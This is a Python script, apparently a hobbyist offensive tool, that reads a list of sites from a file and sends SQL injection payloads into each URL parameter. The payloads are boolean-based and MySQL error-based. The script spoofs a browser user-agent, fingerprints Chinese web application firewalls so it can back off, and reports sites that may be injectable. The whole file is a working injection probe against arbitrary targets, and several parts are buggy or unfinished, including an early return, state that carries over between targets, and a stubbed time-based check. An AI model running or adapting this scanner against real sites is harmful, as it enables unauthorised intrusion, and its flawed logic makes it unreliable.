#!/usr/bin/python
# __author__ = 'jasonsheh'
# -*- coding:utf-8 -*-

import requests
import re
import difflib
import random
import time


class Sqli:
    def __init__(self, targets):
        self.targets = targets
        self.target = ''
        self.results = []
        self.flag_inserted_urls = []
        self.waf = ''
        self.headers = {'user-agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                                      ' (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"'}
        self.rand_num = str(random.randint(100, 999))
        self.payload = {' and {}={}'.format(self.rand_num, self.rand_num): ' and {}=0'.format(self.rand_num),
                        "' and '{}'='{}".format(self.rand_num, self.rand_num): "' and '{}'='0".format(self.rand_num)
                        }
        self.error_based_payload = "AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('{}',(SELECT 1),'{}','x'))s), 0,0 )))".format(self.rand_num, self.rand_num)
        self.waf_rule = {
            '安全狗': 'www.safedog.cn',
            '360webscan': 'safe.webscan.360.cn',
            '360主机': 'zhuji.360.cn/guard/firewall/stopattack.html',
            '云锁': 'yunsuo.com.cn',
            '百度云加速': 'href="http://su.baidu.com"',
            'D盾': 'D盾',
            '云盾': 'yundun',
            '深空Web': '深空Web应用',
            '玄武盾': '玄武盾',
            }
        self.status_code_error = {
            999: "360主机",
            500: "服务器错误!",
            401: "未授权!",
            403: "拒绝访问!",
            404: "not found",
            405: "方法不被允许!",
            406: "无法接受!",
            301: "永久重定向!",
            302: "重定向错误!",
        }

    def init(self):
        if not self.target.startswith('http://') and not self.target.startswith('https://'):
            self.target = 'http://' + self.target

    def _conn(self, url):
        try:
            conn = requests.get(url, timeout=1, headers=self.headers, allow_redirects=False)
            if conn.status_code in self.status_code_error.keys():
                # print(self.status_code_error[conn.status_code])
                return False
            if conn.status_code != 200:
                print("连接错误，响应码为%s" % conn.status_code, url)
                return False
            return conn
        except requests.exceptions.ReadTimeout:
            return False
        except requests.exceptions.ConnectionError:
            return False
        except Exception as e:
            print('不存在注入' + str(e) + self.target)
            return False

    def waf_scan(self, conn):
        self.waf = ''
        for waf, rule in self.waf_rule.items():
            if rule in conn.text:
                self.waf = waf

        return True if self.waf else False

    def insert_payload_flag(self):
        '''
        insert flag to each param

        url like: target.com/a?id=1&page=2
        :return: [
                   target.com/a?id=1insert_payload_here&page=2,
                   target.com/a?id=1&page=2insert_payload_here
                  ]
        '''
        flag = 'insert_payload_here'
        if '&' in self.target:
            for param in self.target.split('&'):
                url = self.target.replace(param, param+flag)
                self.flag_inserted_urls.append(url)
        else:
            self.flag_inserted_urls.append(self.target+flag)

    def bool_based_scan(self):
        for inserted_url in self.flag_inserted_urls:
            for normal_payload, evil_payload in self.payload.items():
                normal_conn = self._conn(inserted_url.replace('insert_payload_here', normal_payload))  # 正常连接
                evil_conn = self._conn(inserted_url.replace('insert_payload_here', evil_payload))
                if not evil_conn or not normal_conn:
                    return False
                if self.waf_scan(evil_conn):
                    return False

                similarity = difflib.SequenceMatcher(None, normal_conn.text, evil_conn.text).ratio()
                if similarity < 0.993:
                    print(evil_conn.url, similarity)
                    return self.target
            return False

    def error_based_scan(self):
        error_based_pattern = self.rand_num + '1' + self.rand_num
        for inserted_url in self.flag_inserted_urls:
            error_based_conn = self._conn(inserted_url.replace('insert_payload_here', self.error_based_payload))
            if not error_based_conn:
                return False
            if re.match(error_based_pattern, error_based_conn.text):
                return self.target
        return False

    def time_based_scan(self):
        print('todo, maybe not')

    def scan(self):
        print('sql注入检测')
        for self.target in self.targets:
            self.init()
            if '?' in self.target:
                self.insert_payload_flag()
                # result = self.bool_based_scan() or self.error_based_scan()
                result = self.error_based_scan()
                if result:
                    print('可能存在注入:' + result)
                    self.results.append(result)


if __name__ == '__main__':
    with open('2.txt', 'r') as file:
        sites = [_.strip() for _ in file]
    Sqli(sites).scan()
